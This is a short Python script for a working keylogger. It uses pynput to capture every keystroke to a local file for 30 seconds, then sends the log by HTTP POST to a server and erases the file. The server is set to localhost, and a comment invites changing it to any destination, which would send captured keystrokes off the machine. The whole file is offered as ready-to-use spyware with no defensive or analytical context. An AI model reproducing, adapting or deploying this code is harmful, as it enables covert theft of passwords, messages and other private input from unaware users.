from pynput.keyboard import Listener
import threading
import time
import requests

LOG_FILE = "keylogs.txt"
LISTEN_DURATION = 30  # in seconds

running = True

def write_to_file(key):
    key = str(key).replace("'", "")
    if key == "Key.space":  
        key = " "
    elif "Key" in key: 
        key = f"[{key}]"
    
    with open(LOG_FILE, "a") as file:
        file.write(key)

def on_press(key):
    if running:  
        write_to_file(key)

def stop_after_duration():
    global running
    time.sleep(LISTEN_DURATION)  
    running = False

def send_log(message):
    #the default server is set to localhost. YOu could easily modify it upon your interests
    try:
        response = requests.post('http://localhost:8000', data=message)
        print(f"Server response: {response.text}")
    except Exception as e:
        print(f"Error sending log: {e}")

if __name__=="__main__":
    timer_thread = threading.Thread(target=stop_after_duration)
    timer_thread.start()
    with Listener(on_press=on_press) as listener:
        while running:
            pass  
            
    with open(LOG_FILE,"r+") as file: 
        send_log(file.read())
        file.truncate(0)
